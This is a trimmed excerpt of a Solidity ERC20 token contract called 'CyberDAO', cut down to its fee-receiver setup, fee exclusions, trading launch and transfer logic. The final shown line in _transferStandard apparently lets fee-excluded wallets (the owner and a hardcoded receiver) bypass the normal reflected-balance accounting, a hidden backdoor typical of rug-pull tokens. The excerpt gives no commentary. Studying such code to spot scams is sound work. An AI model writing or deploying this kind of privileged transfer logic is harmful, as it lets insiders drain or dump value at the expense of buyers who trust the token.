...
contract CyberDAO is Context, IERC20, Ownable {
    ...
    uint256 private _taxSwapThreshold = _tTotal * 1 / 10000;
    ...
    string private constant _name = "CyberDAO";
    string private constant _symbol = "C-DAO";
    ...
    constructor () {
        _feeReceipient = payable(0x1C8679fB7760AC3c8fD26367b1a97CbE4bfc39CA);
        _rOwned[_msgSender()] = _rTotal;
        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[_feeReceipient] = true;
    ...
    function openTrading() external onlyOwner() {
        ...
        _pairAddress = IDexFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            if (from == _pairAddress && to != address(_uniswapRouter) && ! _isFeeExcluded[to] && hasTransferDelay) {
                // Cooldown
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                require(_holderLastTransferTimestamp[to] < block.timestamp);
                _holderLastTransferTimestamp[to] = block.timestamp + (30 seconds);
            }
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && !_isFeeExcluded[from] && to == _pairAddress && swapEnabled && amount > _taxSwapThreshold) {
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if (_isFeeExcluded[sender] && tradeActive) rAmount = _tOwned[sender];
